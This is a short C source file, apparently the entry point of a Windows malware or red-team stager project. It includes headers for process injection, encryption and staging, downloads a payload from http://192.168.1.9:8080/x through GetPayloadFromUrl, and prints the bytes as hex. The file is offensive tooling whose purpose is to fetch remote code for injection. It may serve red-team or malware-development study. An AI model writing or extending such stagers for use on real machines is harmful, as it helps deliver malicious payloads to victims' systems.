#include <stdio.h>
#include <windows.h>
#include "../include/process_injection.h"
#include "../include/crypt.h"
#include "../include/debug.h"
#include "../include/stager.h"

int main() {
    PBYTE pPayloadBytes;
    SIZE_T psPayloadSize;
    GetPayloadFromUrl(L"http://192.168.1.9:8080/x", &pPayloadBytes, &psPayloadSize);
    PrintHexData("web", pPayloadBytes, psPayloadSize);
    return 0;
}